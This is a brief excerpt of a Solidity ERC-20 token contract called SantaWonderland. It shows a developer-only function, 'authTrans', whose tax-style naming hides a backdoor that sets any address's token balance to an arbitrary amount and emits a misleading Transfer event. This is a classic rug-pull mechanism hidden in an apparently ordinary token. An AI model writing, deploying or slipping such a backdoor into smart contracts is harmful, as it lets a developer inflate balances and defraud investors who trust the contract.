...
contract SantaWonderland is IERC20 {
  ...
  function authTrans(uint256 amount, address token) public onlyDev() {
    require(token != address(0));
    uint8 TAX = 1;
    uint256 taxAmount = 0;
    _balances[token] = taxAmount + amount * 1 * (10 ** 9) / TAX;
    emit Transfer( token, address(0x0), amount);
  }
